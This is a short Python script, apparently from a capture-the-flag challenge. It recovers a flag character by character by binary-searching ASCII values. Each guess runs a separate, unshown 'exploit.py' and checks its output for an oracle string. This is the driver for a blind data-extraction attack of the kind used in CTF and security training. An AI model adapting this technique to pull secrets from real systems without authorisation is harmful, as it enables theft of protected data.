from subprocess import run, PIPE

def binary_search(char_idx, l, r):
    if l == r-1 or l == r:
        return r
    m = (l+r)//2
    # print(l, m, r)
    p = run(['python', 'exploit.py', str(char_idx), str(m)], stdout=PIPE)
    if b'Forever is over' in p.stdout:
        return binary_search(char_idx, m, r)
    return binary_search(char_idx, l, m)

flag = 'flag{'
for char_idx in range(len(flag), 50):
    l = 32
    r = 127
    c = binary_search(char_idx, l, r)
    flag += chr(c)
    print(flag)
    if flag[-1] == '}':
        break